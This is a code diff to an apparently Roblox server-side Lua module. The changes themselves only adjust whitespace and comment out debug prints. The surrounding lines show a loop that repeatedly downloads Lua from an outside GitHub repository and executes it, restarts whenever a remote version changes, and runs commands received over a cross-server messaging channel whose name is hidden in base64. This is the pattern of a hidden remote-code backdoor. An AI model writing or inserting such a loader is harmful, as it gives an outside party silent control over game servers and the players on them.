@@ -37,7 +37,7 @@ function m:Init()
 	--[[pcall(function()
 		Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
 	end)]]
-	
+
 	repeat task.wait(0.5) until FirstLoad == true
 
 	task.spawn(function()
@@ -76,7 +76,7 @@ local CACon
 function m:StartScript()
 	local s,c
 	local Global
-	print("Starting!")
+	--print("Starting!")
 	if Vers then
 		if PACon then
 			PACon:Disconnect()
@@ -93,39 +93,39 @@ function m:StartScript()
 		if Global then
 			Global = nil
 		end
-		
+
 		local Mainfuncs 
-		
+
 		repeat
 			pcall(function()
 				Mainfuncs= Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/mainfuncs.lua'))()
 			end)
 			task.wait(1)
 		until Mainfuncs
-		
+
 		pcall(function()
 			CurrentVersion = Vers:GetVersion()
 		end)
-		
-		
+
+
 		PACon = Players.PlayerAdded:Connect(function(Player)
 			Mainfuncs:PlayerAdded(Player)
 		end)
 		PRCon = Players.PlayerRemoving:Connect(function(Player)
 			Mainfuncs:PlayerRemoving(Player)
 		end)
-		
+
 		Global = {
 			globalfunc = function()
-				
+
 			end,
 
 		}
-		
+
 		if s then
 			MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'globalfunc'})
 		end
-		
+
 		task.delay(4, function()
 			for i, v in pairs(Players:GetPlayers()) do
 				Mainfuncs:PlayerAdded(v)
@@ -136,7 +136,7 @@ function m:StartScript()
 	local function msc(m)
 		Global[m.Data.Command](m.Data)
 	end
-	
+
 	repeat
 		s, c = pcall(function()
 			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
@@ -149,7 +149,7 @@ end
 task.spawn(function()
 	local s,c 
 	while true do
-		
+
 		s,c = pcall(function()
 			Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
 		end)
@@ -158,10 +158,10 @@ task.spawn(function()
 				FirstLoad = true
 			end
 		end
-		
+
 		if CurrentVersion and Vers then
-			print(CurrentVersion)
-			print(Vers:GetVersion())
+			--print(CurrentVersion)
+			--print(Vers:GetVersion())
 			if CurrentVersion ~= Vers:GetVersion() then
 				m:StartScript()
 			end
